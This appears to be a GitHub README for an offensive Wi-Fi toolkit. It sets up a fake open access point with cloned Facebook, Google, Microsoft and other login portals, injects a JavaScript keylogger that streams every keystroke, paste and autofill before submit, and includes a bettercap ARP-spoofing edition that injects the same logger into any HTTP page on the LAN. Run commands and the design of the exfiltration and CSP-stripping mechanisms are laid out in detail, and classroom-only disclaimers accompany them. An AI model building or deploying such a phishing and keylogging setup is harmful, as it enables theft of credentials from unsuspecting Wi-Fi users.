# 🛰️ Captive Portal + Live Keylogger — Classroom Demo Build

> **Turn any WiFi adapter into a fake-WiFi captive portal that streams every keystroke, paste, autofill and submit — live, before the user hits Connect.**  
> Built for Kali/Debian/Ubuntu. Zero cloud, zero Docker, zero npm. Pure `hostapd` + `dnsmasq` + `iptables` + stdlib Python.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-blue.svg)]()
[![Python: 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)]()
[![No Docker](https://img.shields.io/badge/docker-none-green.svg)]()
[![Stdlib only](https://img.shields.io/badge/deps-stdlib%20%2B%20pyyaml-green.svg)]()

```
hostapd  (radio)  →  dnsmasq  (DHCP + DNS hijack)  →  iptables  (gate traffic)
       →  portal_server.py  (swappable portal + universal live sensor)
       →  live_view.py / spy_view.py  (teacher live screen)
       →  bettercap edition  (inject the same logger into any HTTP page)
```

---

## ⚠️ Read this first

**Lab / classroom demo only.** Run on **your own network, with your own devices, with explicit consent.**  
This tool captures credentials typed by connected clients. Never deploy it on networks or devices you don't own. Wipe `run/*.log` and `run/keystrokes.jsonl` after every demo. See [Ethics & legal](#-ethics--legal).

---

## ✨ Why this project

| | |
|---|---|
| 📡 **One command to start** | `sudo ./run.sh` — picks iface, mode, SSID, channel, portal, auth, starts everything |
| 🎭 **Swappable portals** | 20 ready-made clones (Facebook, Google, Snapchat, Microsoft, Netflix, PlayStation, LinkedIn, Spotify, Adobe, eBay, …) + `_template` |
| ⌨️ **Universal live keylogger** | Captures keystrokes, paste, autofill, contenteditable, shadow-DOM fields — streams live **before** submit |
| 🖥️ **Three live views** | Terminal (`live_view.py`), browser dashboard (`spy_view.py` on `:8765`), per-device traffic (`traffic_view.py`) |
| 🎯 **bettercap edition** | Inject the same logger into *any* HTTP page on the LAN via MITM |
| 🌐 **2.4 + 5 GHz** | Band + channel picker with DFS handling and auto-fallback sweep |
| 🔌 **Isolated or NAT** | Portal-only mode (no internet, no data drain) or share internet after Connect |
| 🧩 **Stdlib only** | No Docker, no containers, no npm, no cloud — `hostapd` + `dnsmasq` + `iptables` + Python |
| 🔁 **Survives reboot** | `run/last.conf` remembers choices; `setup.sh` only needed once |

---

## 🚀 Quick start

### 1. Install dependencies (once)

```bash
sudo ./setup.sh
# installs: hostapd dnsmasq iptables python3 iw iproute2 rfkill
# checks for an AP-capable WiFi adapter
```

Or manually:
```bash
sudo apt update && sudo apt install -y hostapd dnsmasq iptables python3 iw iproute2 rfkill
```

### 2. Run the portal

```bash
sudo ./run.sh
```

The wizard asks you to pick:

1. **AP interface** (must support AP mode — `iw list` → `* AP`)
2. **Mode** — `isolated` (portal only) or `nat` (share internet after Connect)
3. **Portal theme** — pick from `my-portals/`
4. **SSID / password / band / channel / gateway**
5. **Live window** (foot terminal), **traffic view**, **spy dashboard** (on/off)

### 3. Stop

```bash
sudo ./stop.sh          # stops hostapd/dnsmasq/portal + flushes iptables
```

After a reboot just run `sudo ./run.sh` again — nothing auto-starts, `run/last.conf` keeps your choices.

---

## 📸 What you see

**Terminal live feed** (`live_view.py`) — color-coded per client, shows *where* they're typing and the live tape:
```
--- 192.168.5.10 (AA:BB:CC:DD:EE:01) on [school] ---
[14:23:01] 192.168.5.10 fullname = John
[14:23:03] 192.168.5.10 student_id = S123456
[14:23:05] 192.168.5.10 password ~= •••••••• (8)
```

**Browser spy dashboard** (`spy_view.py` on `http://127.0.0.1:8765/`) — TailAdmin-style dark UI with:
- **LIVE NOW** — who is typing right now, in which field, live unsubmitted value
- **KEYLOG** — persistent per-device/per-field values, secrets masked until REVEAL
- **STREAM** — newest keystroke events as they arrive
- **SUBMITS** — submitted credential lines

**Traffic view** (`traffic_view.py`) — per-device DNS lookups, HTTP URLs, HTTPS sites (via DNS answers), plain-IP connections.

---

## 🎭 Portal themes (20 built-in)

| Category | Portals |
|---|---|
| Social | `facebook`, `linkedin`, `snapchat`, `spotify` |
| Tech giants | `google`, `google_new`, `microsoft`, `adobe`, `ebay`, `mediafire` |
| Entertainment | `netflix`, `playstation` |
| Generic | `default`, `cafe`, `email-demo`, `school`, `school-animated`, `school-demo`, `my-custom-web-ui` |

Create your own:
```bash
cp -r my-portals/_template my-portals/my-cafe
# edit my-portals/my-cafe/index.html — keep <form method=POST action=/auth>
sudo ./run.sh   # pick "my-cafe" (or press [s] while running)
```

Theme variables you can drop into HTML: `{{SSID}} {{CLIENT_IP}} {{CLIENT_MAC}} {{GATEWAY}} {{DEMO_BANNER}}`.

Optional `manifest.json`:
```json
{"name":"my-cafe","description":"...","auth_modes":["open","click"],"entry":"index.html","capture":true}
```

---

## 🔑 Auth modes

| Mode | Behavior |
|---|---|
| `open` | Log + allow (every submit grants access) — demo mode |
| `click` | User must check "accept terms" |
| `voucher` | Code from `codes.txt` |
| `login` | `user:pass` from `users.txt` |
| `remote-http` | POST credentials to your verify URL via a 2nd interface |

`run.sh` auto-sets `auth.mode` to the theme's preferred mode.

---

## ⌨️ Universal live keylogger (v7 sensor)

`portal_server.py` injects `__portal_sensor v7` into every served HTML page:

- **Capture-phase** `input` / `change` / `keydown` / `paste` / `submit` on `INPUT` / `TEXTAREA` / `SELECT` / contenteditable
- **MutationObserver** + shadow-DOM / iframe piercing + 2.5 s autofill sweep
- **Per-keypress batches** carrying `clientId` / `sess` / `page` / `title` / `events[{type,value,field,ftype}]`
- **Transport**: batched `fetch(keepalive)` + XHR fallback + `sendBeacon` on submit/hide; retry queue with per-client `seq` dedupe
- **Endpoints**: `/keys`, `/__portal_keys`, `/beacon` (single, batch, legacy `{field,value}`, `text/plain`); `X-Orig-Host` honored; CORS `*` + `OPTIONS` preflight
- **Append-only log**: `run/keystrokes.jsonl` (`--keys-log`) + in-memory per-IP mirror with 120-event tape
- **Read endpoints**: `/live` (page/title/active_field/active_ago/tape per client), `/tape?since=&limit=`, `/history`, `/submissions`
- **Injection**: idempotent, case-insensitive `</body>`/`</html>`, strips meta-CSP that would block the sensor

---

## 🎯 bettercap edition (MITM)

Inject the same logger into **any HTTP page** on the LAN:

```bash
# 1. edit bettercap.js -> set LOGGER to your logger box IP (default http://192.168.4.1)
# 2. start the logger first
sudo ./run.sh
# 3. run bettercap
sudo bettercap -iface wlan1 -caplet bettercap.cap
# (uncomment arp.spoof block in bettercap.cap for full MITM on lab targets)
```

- Exfil uses absolute `LOGGER` URL with `text/plain` + `no-cors` (no preflight, works cross-origin from any site)
- Failed batches re-queued (memory + localStorage)
- Same-origin `/__bc_keys` image beacon on submit so credentials appear in bettercap's own HTTP log even if the logger is down
- **HTTPS needs `https.proxy` + lab CA** on demo devices; `https://` pages can't exfiltrate to an `http://` logger (mixed-content block) — the same-origin submit beacon is the fallback

---

## 🎮 Controls while running

```
[s] switch portal     [l] live window     [t] traffic     [v] spy dashboard
[r] redirects         [c] clients         [q] quit
```

## 📁 Files

```
run.sh              # interactive wizard + live control loop (1231 lines)
setup.sh            # deps + AP capability check
stop.sh             # stop + flush firewall/iptables
portal_server.py    # stdlib HTTP portal + sensor injection + /keys /live /tape /history /submissions /auth
live_view.py        # terminal live typing feed (localhost only)
spy_view.py         # browser keylog dashboard (TailAdmin-style, :8765, localhost only)
traffic_view.py     # DNS/HTTP/HTTPS per device from tcpdump log
preview_spy.py      # preview spy dashboard with fake data (no root needed)
bettercap.js        # bettercap jsinject payload (same sensor)
bettercap.cap       # bettercap wiring (jsinject + proxy + arp.spoof)
config.yaml         # defaults (SSID, password, channel, iface, mode, portal, gateway, ...)
my-portals/*/       # 20 HTML portal themes + _template
run/                # runtime: last.conf, authorized_macs, *.log, keystrokes.jsonl
Old/                # earlier build (school-test rig + simpler portal engine)
SUMMARY.md          # build notes + known limits
```

---

## 📋 Requirements

- **OS**: Linux (Kali / Debian / Ubuntu)
- **Privileges**: root / sudo
- **Hardware**: WiFi adapter with **AP mode** (`iw list` → `* AP`)
- **Packages**: `hostapd`, `dnsmasq`, `iptables`, `iw`, `ip`, `python3`, `rfkill`
- **Optional**: `foot` (live window), `tcpdump` (traffic view), `bettercap` (MITM edition), `dnsutils` (doctor), `nmcli`

---

## 🌐 2.4 + 5 GHz

`run.sh` supports both bands:

- Band picker: `1) 2.4 GHz` / `2) 5 GHz`
- 5 GHz channels: 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, …, 165
- DFS channels (52–144) flagged as radar-detect with slow start
- hostapd.conf auto-switches `hw_mode=g` (2.4) ↔ `hw_mode=a` + 802.11n/ac (5 GHz)
- Channel 14 = 802.11b-only, country JP
- Auto-fallback sweep if the requested channel is rejected

---

## ⚠️ Known limits (say these out loud in class)

- **HTTPS needs a CA + TLS proxy** (deferred to protect mobile data): stock setup sees HTTP only
- `https://` pages can't exfiltrate to an `http://` logger (mixed-content block) — same-origin submit beacon is the fallback
- Cert-pinned apps (banking, Snapchat) refuse even a lab CA — frame as the lesson, not a bug
- Heavy clones (`snapchat`, `google_new`) need local/vendor assets or a static fallback form to render fully offline
- IPv6 can bypass the portal; HSTS-preloaded real sites error pre-auth

---

## 🔒 Ethics & legal

- Open AP by design (captive portals can't do WPA).
- Admin is **localhost-only** (`spy_view.py` binds `127.0.0.1`).
- **Lab / classroom demo on your own network and own devices with explicit consent only.**
- Never run this on networks or devices you don't own or haven't been authorized to test.
- Wipe `run/*.log` and `run/keystrokes.jsonl` after every demo.

---

## 📜 License

MIT — see `LICENSE` if present; otherwise treat as all rights reserved.

---

## ⭐ If this helped you

Star the repo, fork it, and open issues/PRs. Built for a classroom demo — feedback welcome.

**Repo:** https://github.com/franklinatongo-code/captive-portal-live-keylogger
